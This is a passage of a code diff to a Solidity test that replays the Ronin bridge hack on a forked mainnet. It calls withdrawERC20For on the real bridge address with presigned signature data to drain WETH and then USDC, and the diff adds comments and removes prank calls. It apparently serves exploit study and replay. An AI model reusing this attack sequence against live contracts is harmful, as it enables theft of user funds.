@@ -17,6 +17,11 @@ contract Exploit_RoninBridge is TestHarness, TokenBalanceTracker {
 
     IRoninBridge internal bridge = IRoninBridge(0x1A2a1c938CE3eC39b6D47113c7955bAa9DD454F2);
 
+    // this attack also relies on presigned payloads found on traces
+    // In this case, thought, there is not much to gain from reversing
+    // the logic behind the attack, at least not on chain
+    // the attacker just got access to the private keys, so
+    // there's not much to reverse
     function setUp() external {
         cheat.createSelectFork('mainnet', 14442834); // One block before the first weth transfer
 
@@ -34,7 +39,7 @@ contract Exploit_RoninBridge is TestHarness, TokenBalanceTracker {
         logBalancesWithLabel('Bridge', address(bridge));
 
         console.log('------- STEP 1: DRAIN WETH TOKENS -------');
-        cheat.prank(attacker);
+        
         bridge.withdrawERC20For(
             2000000, 
             attacker, 
@@ -42,13 +47,14 @@ contract Exploit_RoninBridge is TestHarness, TokenBalanceTracker {
             173_600 ether, 
             hex'01175db2b62ed80a0973b4ea3581b22629026e3c6767125f14a98dc30194a533744ba284b5855cfbc34c1416e7106bd1d4ce84f13ce816370645aad66c0fcae4771b010984ea09911beeadcd3dab46621bc81071ba91ce24d5b7873bc6a34e34c6aafa563916059051649b3c1930425aa3a79a293cacf24a21bda3b2a46a1e3d39a6551c01f962ee0e333c2f7261b3077bb7b7544001d555df4bc2e6a5cae2b2dac3d1fe3875cd1d12fadbeb4c01f01e196aa36e395a94de074652971c646b4b3b7149b3121b0178bd67c4fa659087c5f7696d912dee9db37802a3393bf4bd799e22eb201e78d90dc3f57e99d8916cd0282face42324f3afa0d96b0a09c4f914f15cac9c11037b1b0102b7a3a587c5be368f324893ed06df7bdcd3817b1880bd6dada86df15bd50d275fc694a8914d1818a2d432f980a97892f303d5a893a3eec176f46957958ecb991c'
         );
+
         logBalancesWithLabel('Attacker', attacker);
         logBalancesWithLabel('Bridge', address(bridge));
 
         console.log('------- STEP 1: DRAIN USDC TOKENS 5 BLOCKS LATER -------');
         cheat.rollFork(block.number + 4);
         
-        cheat.prank(attacker);
+        
         bridge.withdrawERC20For(
             2000001, 
             attacker, 
